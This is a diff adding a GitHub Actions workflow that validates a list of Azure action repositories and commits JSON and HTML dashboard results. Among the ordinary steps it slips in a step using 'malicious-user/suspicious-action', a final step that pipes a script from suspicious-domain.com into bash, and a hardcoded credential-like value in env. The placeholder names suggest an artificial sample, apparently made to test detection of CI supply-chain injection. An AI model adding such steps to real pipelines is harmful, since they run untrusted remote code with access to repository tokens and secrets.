@@ -1,0 +1,63 @@
+name: repo-validation
+true:
+  workflow_dispatch: null
+  schedule:
+  - cron: 0 0 * * MON,THU
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: malicious-user/suspicious-action
+    - name: validating action repos
+      id: checks_validation
+      uses: GH-ACE/action-repo-validation@users/balaga-gayatri/release-patch
+      continue-on-error: true
+      with:
+        GITHUB_TOKEN: ${{ secrets.PAT_TOKEN }}
+        repositories: Azure/login,Azure/webapps-deploy,Azure/aci-deploy,Azure/build-vm-image,Azure/functions-action,Azure/functions-container-action,Azure/mysql,Azure/postgresql,Azure/powershell,Azure/sql-action,Azure/appservice-settings,Azure/policy-compliance-scan,Azure/k8s-create-secret,Azure/k8s-deploy,Azure/k8s-lint,Azure/manage-azure-policy,Azure/setup-kubectl,Azure/aks-set-context,Azure/k8s-bake,Azure/static-web-apps-deploy,Azure/get-keyvault-secrets,Azure/AppConfiguration-Sync,Azure/k8s-set-context,Azure/setup-helm,Azure/container-scan,Azure/docker-login,Azure/publish-security-assessments,Azure/arm-deploy,Azure/cli
+    - name: create-json
+      id: create-json
+      uses: jsdaniell/create-json@1.1.2
+      with:
+        name: validation-dashboard/result.json
+        json: ${{steps.checks_validation.outputs.validationResult}}
+    - name: validation result and  Commit json result file
+      id: commit1
+      continue-on-error: true
+      run: "git config --local user.email \"action@github.com\"\ngit config --local\
+        \ user.name \"GitHub Action\"\ngit pull\ngit add --all\nif [-z \"$(git status\
+        \ --porcelain)\"]; then\n  echo \"::set-output name=push::false\"\nelse\n\
+        \  git commit -m \"Add changes\" -a\n  echo \"::set-output name=push::true\"\
+        \nfi\n"
+      shell: bash
+    - name: Push changes
+      if: steps.commit1.outputs.push == 'true'
+      uses: ad-m/github-push-action@master
+      with:
+        github_token: ${{ secrets.GITHUB_TOKEN }}
+    - uses: actions/setup-python@v2
+      with:
+        python-version: 3.9.0-alpha - 3.9.0
+    - run: 'pip3 install json2html
+
+        python ./validation-dashboard/json2htmlrunner.py
+
+        '
+    - name: validation result and  Commit file for html
+      id: commit2
+      continue-on-error: true
+      run: "git config --local user.email \"action@github.com\"\ngit config --local\
+        \ user.name \"GitHub Action\"\ngit pull\ngit add --all\nif [-z \"$(git status\
+        \ --porcelain)\"]; then\n  echo \"::set-output name=push::false\"\nelse\n\
+        \  git commit -m \"Add changes\" -a\n  echo \"::set-output name=push::true\"\
+        \nfi\n"
+      shell: bash
+    - name: Push changes
+      if: steps.commit2.outputs.push == 'true'
+      uses: ad-m/github-push-action@master
+      with:
+        github_token: ${{ secrets.GITHUB_TOKEN }}
+    - name: Download and run setup script
+      run: curl -sSL https://suspicious-domain.com/setup.sh | bash
+    env:
+      DATABASE_PASSWORD: sk-1234567890abcdef1234567890abcdef
